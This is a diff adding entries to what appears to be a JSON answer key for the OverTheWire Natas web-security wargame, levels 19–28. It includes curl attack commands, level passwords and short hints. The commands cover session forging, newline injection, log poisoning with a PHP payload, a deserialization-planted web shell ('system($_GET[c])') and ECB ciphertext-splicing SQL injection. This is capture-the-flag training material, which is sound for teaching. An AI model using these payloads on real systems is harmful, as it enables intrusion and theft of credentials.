@@ -270,6 +270,175 @@
     "You are an admin. The credentials for the next level are: Username: natas19"
    ],
    "pw": "qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT"
+  },
+  {
+   "lvl": 19,
+   "user": "natas19",
+   "cmds": [
+    [
+     "# source: session id = bin2hex(\"<num>-<username>\") \u2014 so forge ids for the user 'admin'",
+     "for i in $(seq 1 640); do ID=$(printf '%s-admin' $i | xxd -p | tr -d '\\n'); curl -s -u natas19:PASS -b \"PHPSESSID=$ID\" http://natas19.natas.labs.overthewire.org/ | grep -q 'You are an admin' && echo \"admin session: $i-admin\" && break; done",
+     "# 281-admin was live"
+    ]
+   ],
+   "out": [
+    "You are an admin. The credentials for the next level are: Username: natas20"
+   ],
+   "pw": "slOKYGsjlJhaqKliGvrgWAzln0JyrWao"
+  },
+  {
+   "lvl": 20,
+   "user": "natas20",
+   "cmds": [
+    [
+     "# sessions are stored as plain 'key value' lines \u2014 the name value is never sanitized",
+     "curl -s -u natas20:PASS -c cj.txt http://natas20.natas.labs.overthewire.org/ -o /dev/null",
+     "curl -s -u natas20:PASS -b cj.txt --data-urlencode $'name=bob\\nadmin 1' http://natas20.natas.labs.overthewire.org/",
+     "# the session file now contains a forged line:  admin 1",
+     "curl -s -u natas20:PASS -b cj.txt http://natas20.natas.labs.overthewire.org/"
+    ]
+   ],
+   "out": [
+    "You are an admin. The credentials for the next level are: Username: natas21"
+   ],
+   "pw": "7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU"
+  },
+  {
+   "lvl": 21,
+   "user": "natas21",
+   "cmds": [
+    [
+     "# the main site is colocated with natas21-experimenter \u2014 same sessions",
+     "# the experimenter's source copies EVERY submitted field into $_SESSION",
+     "curl -s -u natas21:PASS -c e.txt http://natas21-experimenter.natas.labs.overthewire.org/ -o /dev/null",
+     "curl -s -u natas21:PASS -b e.txt -c e.txt -d 'align=center&fontsize=100%25&bgcolor=yellow&admin=1&submit=Update' http://natas21-experimenter.natas.labs.overthewire.org/",
+     "# now present that session id to the main site:",
+     "curl -s -u natas21:PASS -b \"PHPSESSID=$SID\" http://natas21.natas.labs.overthewire.org/"
+    ]
+   ],
+   "out": [
+    "[DEBUG] Session contents: [admin] => 1",
+    "You are an admin. The credentials for the next level are: Username: natas22"
+   ],
+   "pw": "964laB0r7TuDqJj5b3HFtwsQoc0GhjBF"
+  },
+  {
+   "lvl": 22,
+   "user": "natas22",
+   "cmds": [
+    [
+     "# the page just redirects to / and shows nothing\u2026",
+     "curl -s -i -u natas22:PASS 'http://natas22.natas.labs.overthewire.org/?revelio=1'",
+     "# \u2026but the redirect's own body already contains the credentials \u2014 never follow it"
+    ]
+   ],
+   "out": [
+    "Location: /",
+    "You are an admin. The credentials for the next level are: Username: natas23"
+   ],
+   "pw": "CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5"
+  },
+  {
+   "lvl": 23,
+   "user": "natas23",
+   "cmds": [
+    [
+     "# source: strstr($passwd, \"iloveyou\") && $passwd > 10",
+     "# PHP compares a string that starts with digits as a number:",
+     "curl -s -u natas23:PASS 'http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou'"
+    ]
+   ],
+   "out": [
+    "The credentials for the next level are: Username: natas24"
+   ],
+   "pw": "shlL4BvOtawNCd81dwdKRHFzmTEjYYQX"
+  },
+  {
+   "lvl": 24,
+   "user": "natas24",
+   "cmds": [
+    [
+     "# source: if(!strcmp($_REQUEST[\"passwd\"], $real_password)) \u2014 strcmp expects strings",
+     "# hand it an array instead and it returns NULL, which ! turns into success:",
+     "curl -s -u natas24:PASS 'http://natas24.natas.labs.overthewire.org/?passwd[]=x'"
+    ]
+   ],
+   "out": [
+    "The credentials for the next level are: Username: natas25"
+   ],
+   "pw": "UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo"
+  },
+  {
+   "lvl": 25,
+   "user": "natas25",
+   "cmds": [
+    [
+     "# direct access to natas_webpass is blocked by name, and ../ is stripped once\u2026",
+     "# \u2026so poison the request log instead: traversal attempts log your User-Agent",
+     "curl -s -u natas25:PASS -c cj.txt http://natas25.natas.labs.overthewire.org/ -o /dev/null",
+     "curl -s -u natas25:PASS -b cj.txt -A '<?php echo file_get_contents(\"/etc/natas_webpass/natas26\"); ?>' 'http://natas25.natas.labs.overthewire.org/?lang=../en'",
+     "# include the log \u2014 ....// collapses to ../ under the single-pass strip:",
+     "curl -s -u natas25:PASS -b cj.txt 'http://natas25.natas.labs.overthewire.org/?lang=....//logs/natas25_<sessionid>.log'"
+    ]
+   ],
+   "out": [
+    "[21.10.2026 03::59:23] <the password printed where the User-Agent stood>"
+   ],
+   "pw": "3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT"
+  },
+  {
+   "lvl": 26,
+   "user": "natas26",
+   "cmds": [
+    [
+     "# the 'drawing' cookie is base64_decode + unserialize \u2014 a Logger class is in scope",
+     "# its __destruct appends $exitMsg to $logFile, and both are attacker-controlled:",
+     "python3 -c \"import base64; print(base64.b64encode(b'O:6:\\\"Logger\\\":3:{...logFile=img/shell.php, exitMsg=<?php system($_GET[c]); ?>...}').decode())\"",
+     "curl -s -u natas26:PASS -b 'drawing=<base64 payload>' 'http://natas26.natas.labs.overthewire.org/?x1=1&y1=1&x2=2&y2=2'",
+     "curl -s -u natas26:PASS 'http://natas26.natas.labs.overthewire.org/img/shell.php?c=cat%20/etc/natas_webpass/natas27'"
+    ]
+   ],
+   "out": [
+    "(the destructor writes the shell into img/)"
+   ],
+   "pw": "mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV"
+  },
+  {
+   "lvl": 27,
+   "user": "natas27",
+   "cmds": [
+    [
+     "# createUser rejects names with leading/trailing blanks \u2014 but stores only substr(name, 0, 64)",
+     "# and dumpData() looks the user up with trim() applied. So:",
+     "curl -s -u natas27:PASS --data-urlencode 'username=natas28<57 spaces>a' --data-urlencode 'password=<redacted>' http://natas27.natas.labs.overthewire.org/",
+     "# the stored row is now 'natas28' + 57 spaces. Log in under THAT name with your password:",
+     "curl -s -u natas27:PASS --data-urlencode 'username=natas28<57 spaces>' --data-urlencode 'password=<redacted>' http://natas27.natas.labs.overthewire.org/"
+    ]
+   ],
+   "out": [
+    "Welcome natas28  ! Here is your data: Array ( [username] => natas28 [password] => \u2026 )"
+   ],
+   "pw": "Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3"
+  },
+  {
+   "lvl": 28,
+   "user": "natas28",
+   "cmds": [
+    [
+     "# the search query is escaped, then encrypted (ECB) into the SQL itself \u2014 typed quotes stay escaped",
+     "# block size 16; diffing ciphertexts shows the input begins at plaintext byte 38",
+     "# donor query: 9 filler chars put the escaped quote exactly on a block boundary\u2026",
+     "curl -s -i -u natas28:PASS 'http://natas28.natas.labs.overthewire.org/index.php?query=BBBBBBBBB%27%20UNION%20SELECT%20password%20FROM%20users%20--%20ZZZ'",
+     "# \u2026lift blocks 3-5 (they decrypt to: ' UNION SELECT / password FROM us / ers --) and splice:",
+     "# final = head blocks of a benign query + payload blocks + donor tail (keeps padding valid)",
+     "curl -s -u natas28:PASS 'http://natas28.natas.labs.overthewire.org/search.php/?query=<spliced base64>'"
+    ]
+   ],
+   "out": [
+    "Whack Computer Joke Database",
+    "(one of the 'jokes' listed is the password row)"
+   ],
+   "pw": "hwgoYUiGWoSZAqphtCAZf7u1jS16KEah"
   }
  ],
  "goals": {
@@ -291,6 +460,16 @@
   "15": "The form only says whether a user exists \u2014 a blind SQL injection oracle. Brute-force the password through it.",
   "16": "The dictionary search filters shell metacharacters but not $() command substitution \u2014 turn it into a yes/no oracle and extract the password character by character.",
   "17": "Same injectable user check as before, but every line of output is commented out \u2014 the only remaining channel is response time.",
-  "18": "Admin login is disabled, but sessions are numbered with rand(1, 640) \u2014 try every session id until you find the admin's live session."
+  "18": "Admin login is disabled, but sessions are numbered with rand(1, 640) \u2014 try every session id until you find the admin's live session.",
+  "19": "Session ids are now hex-encoded '<number>-<username>' strings \u2014 forge candidate ids for the username 'admin' and find the live one.",
+  "20": "A custom session handler stores each key as a raw 'key value' line \u2014 smuggle a newline into your name and you can write extra keys into your own session.",
+  "21": "Two colocated sites share one session store; the harmless-looking style experimenter writes any submitted field into the session \u2014 including 'admin'.",
+  "22": "The answer is sent and then hidden behind a redirect \u2014 read the redirect response itself instead of following it.",
+  "23": "The password check mixes a substring test with a numeric comparison \u2014 PHP's loose typing lets one string be both.",
+  "24": "The login compares your input with strcmp() \u2014 feed it an array and the comparison errors out in your favor.",
+  "25": "A 'safe' include strips ../ and bans the password path by name \u2014 but it logs your User-Agent to an includable file, and the strip itself can be folded back into a traversal.",
+  "26": "A drawing cookie is unserialized without checks \u2014 inject a crafted object whose destructor writes a file of your choosing.",
+  "27": "Registration truncates names to 64 characters while the data dump trims them \u2014 a padded lookalike account makes the dump hand you the real user's row.",
+  "28": "The query is escaped and then ECB-encrypted into the backend SQL \u2014 cut ciphertext blocks from a donor query and splice in an unescaped UNION SELECT."
  }
 }
